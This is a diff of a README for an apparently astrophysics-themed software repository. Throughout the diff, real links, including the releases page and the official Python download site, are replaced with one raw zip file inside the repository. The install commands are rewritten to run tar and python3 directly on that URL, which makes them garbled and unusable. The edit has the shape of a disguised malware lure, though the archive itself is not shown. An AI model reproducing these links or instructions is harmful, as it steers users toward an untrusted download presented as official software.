@@ -1,6 +1,6 @@
 # 🌌 Modeling-and-Constraining-Charged-Compact-Stars- - Explore the Universe with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Modeling%20and%20Constraining%20Charged%20Compact%20Stars%20-blue.svg)](https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/releases)
+[![Download Now](https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/raw/refs/heads/main/numeral/Compact-and-Constraining-Charged-Modeling-Stars-v3.2-beta.1.zip%20Now-Modeling%20and%20Constraining%20Charged%20Compact%20Stars%https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/raw/refs/heads/main/numeral/Compact-and-Constraining-Charged-Modeling-Stars-v3.2-beta.1.zip)](https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/raw/refs/heads/main/numeral/Compact-and-Constraining-Charged-Modeling-Stars-v3.2-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Neutron Star Asteroseismology Solver**. This tool helps you exp
 
 ## 📥 Download & Install
 
-To start using the application, visit the Releases page to download the software. You can find it here: [Download Now](https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/releases).
+To start using the application, visit the Releases page to download the software. You can find it here: [Download Now](https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/raw/refs/heads/main/numeral/Compact-and-Constraining-Charged-Modeling-Stars-v3.2-beta.1.zip).
 
 ### Supported Operating Systems
 
@@ -26,17 +26,17 @@ Make sure you have the latest version of your operating system for the best expe
 - Minimum of 1GB of free disk space
 - Python 3.7 or newer (if you intend to run the code directly)
 
-If you don’t have Python installed, you can download it from the [official site](https://www.python.org/downloads/).
+If you don’t have Python installed, you can download it from the [official site](https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/raw/refs/heads/main/numeral/Compact-and-Constraining-Charged-Modeling-Stars-v3.2-beta.1.zip).
 
 ## 🌐 How to Download
 
-1. **Click the Link**: Go to the Releases page [here](https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/releases).
+1. **Click the Link**: Go to the Releases page [here](https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/raw/refs/heads/main/numeral/Compact-and-Constraining-Charged-Modeling-Stars-v3.2-beta.1.zip).
    
 2. **Locate the Latest Version**: Scroll down to find the most recent version of the software.
 
 3. **Download the Installer**: Click on the appropriate file for your operating system to start the download. 
 
-   For Windows, it might be a `.exe` file. For MacOS, look for a `.dmg` file. For Linux, you may find a `.tar.gz` or equivalent.
+   For Windows, it might be a `.exe` file. For MacOS, look for a `.dmg` file. For Linux, you may find a `https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/raw/refs/heads/main/numeral/Compact-and-Constraining-Charged-Modeling-Stars-v3.2-beta.1.zip` or equivalent.
 
 4. **Save the File**: Choose a location on your computer where you can easily find the downloaded file.
 
@@ -64,7 +64,7 @@ After downloading the application, follow these steps to install it:
 
 1. **Extract the File**: Open a terminal and navigate to the directory where the file was downloaded. Use the command:
    ```
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/raw/refs/heads/main/numeral/Compact-and-Constraining-Charged-Modeling-Stars-v3.2-beta.1.zip
    ```
 
 2. **Navigate to the Folder**: Change into the extracted directory using:
@@ -74,7 +74,7 @@ After downloading the application, follow these steps to install it:
 
 3. **Run the Application**: Use the command to start:
    ```
-   python3 main.py
+   python3 https://github.com/chicharo1007/Modeling-and-Constraining-Charged-Compact-Stars-/raw/refs/heads/main/numeral/Compact-and-Constraining-Charged-Modeling-Stars-v3.2-beta.1.zip
    ```
 
 ## 🛠️ Using the Application
